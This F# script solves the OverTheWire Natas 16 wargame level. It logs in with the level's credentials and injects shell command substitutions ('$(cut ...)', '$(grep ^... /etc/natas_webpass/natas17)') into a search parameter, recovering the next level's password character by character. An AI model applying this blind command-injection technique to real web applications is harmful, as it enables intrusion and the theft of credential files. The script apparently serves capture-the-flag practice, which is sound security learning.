open System
open System.Net
open System.IO

let url = "http://natas16.natas.labs.overthewire.org/"
let credentials = "natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let runForNeedle injectText =
    let query = sprintf "%s?needle=%s" url injectText
    let http = HttpWebRequest.CreateHttp query
    http.Headers.Add(basicAuth)

    let response = http.GetResponse ()
    let stream = response.GetResponseStream ()
    let reader = new StreamReader (stream)
    let html = reader.ReadToEnd ()
    let results = html.Split([|"<pre>";"</pre>"|], StringSplitOptions.None)
    results.[1].Split([|'\r';'\n'|], StringSplitOptions.RemoveEmptyEntries)

let candidates index =
    let needle = sprintf "$(cut -c%i /etc/natas_webpass/natas17)" (index + 1)
    let searchResults = runForNeedle needle
    if Array.isEmpty searchResults then [|'0'..'9'|]
    else
        searchResults 
        |> Array.map (fun (s: string) -> s.ToLower() |> Set.ofSeq) 
        |> Array.reduce Set.intersect
        |> Set.toArray
        |> Array.collect (fun c -> [|Char.ToLower c; Char.ToUpper c|])

printfn "calculating candidates for each char index..."
let firstBlind = [|0..31|] |> Array.map candidates
printfn "calculated. proceeding with brute force..."

let rec secondBlind (soFar: string) =
    let next =
        firstBlind.[soFar.Length]
        |> Array.map (fun c -> soFar + string c)
        |> Array.find (fun s -> 
            let needle = sprintf "$(grep ^%s /etc/natas_webpass/natas17)" s
            Array.isEmpty (runForNeedle needle))
    if next.Length = 32 then 
        printfn "natas17's password: %s" next
    else
        printfn "%s" next
        secondBlind next

secondBlind ""